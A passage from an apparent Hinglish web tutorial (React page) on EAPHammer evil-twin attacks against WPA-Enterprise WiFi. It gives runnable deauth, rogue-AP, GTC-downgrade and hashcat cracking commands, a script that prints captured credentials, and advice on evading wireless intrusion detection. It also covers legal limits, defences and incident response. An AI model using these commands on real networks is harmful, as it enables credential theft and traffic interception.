sudo aireplay-ng --deauth 5 -a BSSID wlan1

# Chained attack (recon → evil twin → credential crack):
# Step 1: Recon
sudo airodump-ng wlan0 --write recon
# Step 2: Evil twin
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" \\
  --channel 6 --creds --negotiate gtc-downgrade
# Step 3: Crack
hashcat -m 5500 output/hashes.txt rockyou.txt

# Stealth attack (short burst):
# Jaldi credentials capture karo aur band kar do
timeout 300 sudo python3 eaphammer -i wlan0 \\
  --essid "CorpWiFi" --creds --negotiate gtc-downgrade`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Kya EAPHammer WPA2-Personal crack kar sakta hai?', a: 'Nahi, EAPHammer specifically WPA-Enterprise (802.1X) ke liye hai। WPA2-Personal ke liye Aircrack-ng, Hashcat, ya Airgeddon use karo।' },
          { q: 'Kaunsa wireless adapter best hai?', a: 'Alfa AWUS036ACH ya AWUS036NHA (Atheros chipset)। Adapter ko monitor mode aur AP mode dono support karna chahiye। Realtek chipsets bhi kaam karte hain।' },
          { q: 'GTC downgrade kya hai?', a: 'EAP-GTC authentication method plain text mein credentials bhejta hai। Downgrade attack client ko force karta hai GTC use karne ke liye — credentials plain text mein mil jaate hain। Sabse effective attack hai।' },
          { q: 'Kya modern devices vulnerable hain?', a: 'Windows laptops generally vulnerable hain। iOS 14+ aur Android 10+ probe randomization use karte hain jo Karma attacks partially prevent karta hai। Lekin evil twin attack abhi bhi kaam karta hai agar device auto-connect kare।' },
          { q: 'Captured hashes kaise crack karein?', a: 'MS-CHAPv2 hashes ke liye hashcat -m 5500 ya john --format=mschapv2 use karo। GTC downgrade se plain text credentials directly milte hain — cracking ki zaroorat nahi।' },
          { q: 'Evil twin detect kaise hota hai?', a: 'WireIDS (Wireless IDS) duplicate SSIDs detect karta hai। Certificate validation enabled ho toh attack fail ho jaata hai। Clients ko certificate warning dikhegi।' },
          { q: 'Kya EAPHammer free hai?', a: 'Haan, completely free aur open source (GPLv3)। GitHub par available hai। Commercial use bhi free hai।' },
          { q: 'Kitna time lagta hai attack mein?', a: 'Kuch minutes se lekar hours tak — victim ke device aur network configuration par depend karta hai। Auto-connect enabled devices jaldi connect hote hain।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Real-World Case Studies</h2>
      <p>
        EAPHammer real-world red team engagements और wireless security audits में extensively use होता है:
      </p>
      <p>
        <strong className="text-white">Case Study 1 — Corporate WiFi Audit:</strong> एक Indian IT company ने अपने WPA-Enterprise network की security test करने के लिए red team hire किया। Red team ने EAPHammer use करके GTC downgrade attack किया — 2 घंटे में 15 employee credentials capture हो गईं। Company ने तुरंत GTC disable किया और EAP-TLS enforce किया। यह audit demonstrate करता है कि WPA-Enterprise भी vulnerable हो सकता है अगर GTC enabled हो।
      </p>
      <p>
        <strong className="text-white">Case Study 2 — Conference WiFi Attack:</strong> DEF CON wireless village में researchers ने EAPHammer demonstrate किया। Conference WiFi WPA-Enterprise use कर रहा था। Researchers ने evil twin AP बनाया और Karma mode enable किया। 30 मिनट में 50+ devices auto-connect हो गए और credentials capture हुए। यह real-world scenario में EAPHammer की effectiveness prove करता है।
      </p>
      <p>
        <strong className="text-white">Case Study 3 — University Network Test:</strong> एक university ने अपने campus WiFi की security audit करवाई। Security team ने EAPHammer से hostile portal attack किया — students को "University WiFi Login" page दिखा। 200+ students ने credentials enter किए। University ने बाद में EAP-TLS implement किया और students को security awareness training दी।
      </p>
      <p>
        <strong className="text-white">Case Study 4 — Hotel WiFi Assessment:</strong> एक hotel chain ने guest WiFi security test करवाई। Hotel WiFi WPA-Enterprise use करता था guests के लिए। Security auditor ने EAPHammer से evil twin बनाया — lobby में बैठकर 10 guest credentials capture कर लीं। Hotel ने captive portal with proper SSL implement किया और guest isolation enable किया।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        EAPHammer को दूसरे wireless security tools के साथ combine करके comprehensive WiFi attacks कर सकते हो:
      </p>
      <CodeBlock
        title="EAPHammer + Aircrack-ng Workflow"
        code={`# Complete WPA-Enterprise attack workflow:

# Step 1: Recon with Airodump-ng
sudo airodump-ng wlan0 --write recon
# Target SSID, channel, BSSID note करो

# Step 2: Client deauth (force reconnect):
sudo aireplay-ng --deauth 10 -a TARGET_BSSID wlan0
# Clients disconnect होंगे और evil AP से reconnect करेंगे

# Step 3: Evil twin with EAPHammer:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" \\
  --channel 6 --creds --negotiate gtc-downgrade

# Step 4: Crack captured hashes:
hashcat -m 5500 output/hashes.txt rockyou.txt
# ya john --format=mschapv2 output/hashes.txt

# EAPHammer + Kismet (monitoring):
# Terminal 1: Kismet se monitoring
sudo kismet -c wlan1
# Terminal 2: EAPHammer attack
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --creds
# Kismet se evil AP ka signal strength monitor karo

# EAPHammer + Wireshark (packet analysis):
# EAPHammer run karo with pcap capture:
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --creds
# Wireshark mein EAP packets analyze karo
# Filter: eap || radius`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        EAPHammer captured credentials को analyze करके reports बना सकते हो:
      </p>
      <CodeBlock
        title="Credential Analysis"
        code={`# Captured credentials location:
ls output/
# creds.txt — plain text credentials (GTC/hostile portal)
# hashes.txt — MS-CHAPv2 hashes (PEAP/EAP-TTLS)
# eaphammer.log — detailed attack log

# Credentials analyze करो:
cat output/creds.txt
# Format: username:password

# Hash type identify करो:
hashcat -m 5500 output/hashes.txt --example-hashes
# MS-CHAPv2 format check

# Crack attempt:
hashcat -m 5500 output/hashes.txt /usr/share/wordlists/rockyou.txt

# Report generation script:
#!/bin/bash
echo "=== EAPHammer Attack Report ==="
echo "Date: $(date)"
echo "Target SSID: $1"
echo ""
echo "Credentials Captured: $(wc -l < output/creds.txt 2>/dev/null || echo 0)"
echo "Hashes Captured: $(wc -l < output/hashes.txt 2>/dev/null || echo 0)"
echo ""
echo "=== Captured Credentials ==="
cat output/creds.txt 2>/dev/null
echo ""
echo "=== Attack Log ==="
tail -20 output/eaphammer.log 2>/dev/null`}
      />

      <h2>Performance Tuning</h2>
      <p>
        EAPHammer की effectiveness बढ़ाने के लिए कुछ optimization tips:
      </p>
      <CodeBlock
        title="Optimization Tips"
        code={`# Channel optimization:
# Target network ke same channel par raho
# Auto-channel se better hai manually set karo
sudo python3 eaphammer -i wlan0 --essid "CorpWiFi" --channel 6 --creds

# Signal strength optimization:
# Physical location close karo target AP se
# High-gain antenna use karo (Alfa adapters)
# Evil AP ka signal real AP se 10-15 dB strong hona chahiye

# Interface optimization:
# Dedicated adapter use karo (monitor + AP mode support)
# Built-in WiFi adapter se better hai USB adapter
# Alfa AWUS036ACH ya AWUS036NHA recommended

# Timing optimization:
# Off-hours mein attack karo (raat ko, weekend)
# Peak hours mein WIDS zyada alert hota hai
# Short burst attacks — 5-10 minute window

# Attack selection:
# GTC downgrade fastest hai — try karo pehle
# Hostile portal second option — agar GTC fail ho
# Karma + portal maximum victims ke liye`}
      />

      <h2>WiFi Security Assessment Methodology</h2>
      <p>
        WPA-Enterprise security audit करने के लिए structured methodology follow करना चाहिए:
      </p>
      <CodeBlock
        title="Assessment Methodology"
        code={`# Phase 1: Reconnaissance
# सभी nearby WiFi networks scan करो:
sudo airodump-ng wlan0 --write recon
# Target network identify करो:
# - SSID name
# - Channel number
# - BSSID (AP MAC)
# - Authentication type (WPA-Enterprise vs Personal)
# - Connected clients

# Phase 2: Vulnerability Assessment
# WPA-Enterprise type identify करो:
# PEAP, EAP-TTLS, EAP-TLS, EAP-GTC
# Certificate validation check करो:
# Kya client certificate validate karta hai?

# Phase 3: Attack Execution
# Attack type select करो network config ke basis par:
# GTC enabled? → GTC downgrade
# No cert validation? → Evil twin
# Auto-connect enabled? → Karma attack
# Open network? → Hostile portal

# Phase 4: Post-Exploitation
# Captured credentials crack करो:
hashcat -m 5500 hashes.txt rockyou.txt
# Network access test करो:
# क्या captured creds se WiFi login hota hai?
# Lateral movement possibilities explore करो

# Phase 5: Reporting
# सभी findings document करो:
# - Attack method used
# - Credentials captured (redacted)
# - Timeline of attack
# - Remediation recommendations`}
      />

      <h2>Legal and Ethical Considerations</h2>
      <p>
        EAPHammer use करते समय legal और ethical boundaries का strict पालन करना चाहिए:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Written Authorization:</strong> बिना written permission के WiFi attacks strictly illegal हैं। Authorization letter में scope, timeline, और methods clearly define होने चाहिए</li>
        <li><strong className="text-white">Scope Limitations:</strong> सिर्फ authorized networks पर test करो। Neighboring networks accidentally target न हों — channel और SSID carefully set करो</li>
        <li><strong className="text-white">Data Handling:</strong> Captured credentials sensitive data हैं। Encrypt करके store करो। Report के बाद securely delete करो</li>
        <li><strong className="text-white">Incident Response:</strong> अगर accidentally unauthorized device connect हो जाए तो immediately attack stop करो और document करो</li>
        <li><strong className="text-white">Professional Conduct:</strong> Captured credentials misuse न करो। सिर्फ security assessment purpose के लिए use करो</li>
        <li><strong className="text-white">Indian Law:</strong> IT Act 2000 Section 43 and 66 — unauthorized network access 3 years jail + 5 lakh fine</li>
        <li><strong className="text-white">Responsible Disclosure:</strong> Agar client के अलावा कोई third-party vulnerability मिले तो responsible disclosure follow करो</li>
      </ul>

      <h2>Enterprise Network Defense Strategies</h2>
      <p>
        Organizations को WPA-Enterprise networks को evil twin attacks से बचाने के लिए comprehensive defense strategy adopt करनी चाहिए:
      </p>
      <CodeBlock
        title="Defense Implementation"
        code={`# RADIUS Server Hardening:
# 1. GTC completely disable करो:
# FreeRADIUS config में:
# eap { default_eap_type = peap }
# gtc { auth_type = PAP }  # Remove this block

# 2. EAP-TLS enforce करो:
# सिर्फ certificate-based authentication allow करो
# PEAP/EAP-TTLS disable करो जहाँ possible हो

# 3. Certificate pinning:
# Clients में RADIUS server certificate pin करो
# GPO (Windows) ya MDM (macOS/iOS) से deploy करो

# 4. RADIUS server certificate monitoring:
# Certificate expiry alerts setup करो
# Unauthorized certificate changes detect करो

# Wireless IDS Configuration:
# Kismet, AirMagnet, ya Cisco WLC IDS enable करो
# Rogue AP detection rules configure करो:
# - Duplicate SSID detection
# - Unauthorized BSSID detection
# - Signal strength anomaly detection
# - Client behavior analysis

# Network Segmentation:
# WiFi network VLAN isolate करो
# Guest network completely separate रखो
# Corporate network access restricted रखो
# Firewall rules between WiFi segments

# Client Hardening:
# GPO se "Do not connect to non-preferred networks" enable
# Auto-connect to open networks disable
# Certificate validation enforce
# 802.11w (PMF) enable`}
      />

      <h2>Wireless Adapter Compatibility</h2>
      <p>
        EAPHammer के लिए compatible wireless adapter बहुत important है — monitor mode और AP mode दोनों support करना चाहिए:
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Adapter</th>
              <th className="text-left py-2 px-3 text-neon-green">Chipset</th>
              <th className="text-left py-2 px-3 text-neon-green">Monitor Mode</th>
              <th className="text-left py-2 px-3 text-neon-green">AP Mode</th>
              <th className="text-left py-2 px-3 text-neon-green">EAPHammer Support</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Alfa AWUS036ACH</td><td className="py-2 px-3">Realtek RTL8812AU</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">Best choice</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Alfa AWUS036NHA</td><td className="py-2 px-3">Atheros AR9271</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">Excellent</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Alfa AWUS036ACM</td><td className="py-2 px-3">MediaTek MT7612U</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">Good</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">TP-Link TL-WN722N v1</td><td className="py-2 px-3">Atheros AR9271</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">Good (v1 only)</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Built-in WiFi</td><td className="py-2 px-3">Various</td><td className="py-2 px-3">Usually No</td><td className="py-2 px-3">Usually No</td><td className="py-2 px-3">Not recommended</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Incident Response</h2>
      <p>
        अगर organization को suspect करे कि evil twin attack हो रहा है, तो तुरंत यह steps लेने चाहिए:
      </p>
      <CodeBlock
        title="Incident Response Steps"
        code={`# Step 1: Detection
# WIDS alert check करो — rogue AP detection
# Duplicate SSID alerts
# Unauthorized BSSID alerts
# Signal strength anomalies

# Step 2: Identification
# Rogue AP ka physical location identify करो
# Direction finding (DF) tools use करो
# BSSID vendor lookup: https://macvendors.com
# Connected clients list check करो

# Step 3: Containment
# Affected clients ko disconnect karo
# Deauth frames bhejo rogue AP ko
# WLC se rogue AP containment enable karo
# Physical security team ko bhejo location par

# Step 4: Eradication
# Rogue AP physically remove karo
# Agar employee ka hai toh disciplinary action
# Network credentials reset karo (affected users)
# RADIUS server logs analyze karo

# Step 5: Recovery
# Network monitoring加强 karo
# WIDS rules update karo
# Client certificates re-issue karo agar compromised

# Step 6: Lessons Learned
# Root cause分析 karo
# Security policies update karo
# Employee training conduct karo
# Incident report document karo`}
      />

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">hostapd-mana</td><td className="py-2 px-3">Rogue AP + MANA attacks</td><td className="py-2 px-3">Flexible configuration, Karma + MANA</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Fluxion</td><td className="py-2 px-3">WiFi phishing + handshake capture</td><td className="py-2 px-3">Automated, menu-driven</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Wifiphisher</td><td className="py-2 px-3">WiFi phishing automation</td><td className="py-2 px-3">Many phishing scenarios</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Airgeddon</td><td className="py-2 px-3">Multi-attack WiFi framework</td><td className="py-2 px-3">GUI interface, many attack types</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">FreeRADIUS-WPE</td><td className="py-2 px-3">Rogue RADIUS server</td><td className="py-2 px-3">Manual setup, powerful</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">hostapd-wpe</td><td className="py-2 px-3">WPA-Enterprise rogue AP</td><td className="py-2 px-3">Built into hostapd</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Wifi-Pumpkin3</td><td className="py-2 px-3">Rogue AP framework</td><td className="py-2 px-3">Plugins, MITM capabilities</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Bettercap</td><td className="py-2 px-3">Network attack framework</td><td className="py-2 px-3">WiFi + BLE + net attacks</td></tr>
          </tbody>
        </table>
      </div>

      <div className="success-box mt-6">
        <strong>✅ Pro Tips:</strong>
        <ul className="list-disc list-inside mt-2 space-y-1">
          <li>Channel hamesha target network ke same rakho — different channel par victims connect nahi honge</li>
          <li>Evil AP ka signal real AP se strong hona chahiye — physical location close karo target se</li>
          <li>GTC downgrade sabse effective attack hai — plain text credentials milte hain bina cracking ke</li>
          <li>Hostile portal se phishing page dikhao — victims khud credentials enter karte hain</li>
          <li>Karma mode se auto-connect victims exploit karo — especially Windows laptops</li>
          <li>Captured MS-CHAPv2 hashes hashcat -m 5500 se crack karo — weak passwords jaldi crack hote hain</li>
          <li>Short burst attacks karo WIDS evasion ke liye — jaldi credentials capture karo aur band kar do</li>
          <li>Hamesha physical location close raho target se — signal strength bahut matter karta hai</li>
          <li>Compatible wireless adapter use karo — Atheros/Realtek chipsets best hain</li>
          <li>Hamesha authorized permission ke saath hi test karo — evil twin attacks illegal hain bina permission ke</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> EAPHammer एक powerful WPA-Enterprise attack tool है। Evil twin attacks बहुत dangerous हain — victim ka internet traffic intercept hota hai, credentials capture hote hain, aur network access mil sakta hai। Bina written authorization ke karna strictly illegal hai। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत WiFi attacks गंभीर अपराध है। Corporate environment mein red team engagement ke through hi test karo। Document everything — authorization letter, scope, timeline।
      </div>
    </TutorialLayout>
  )
}
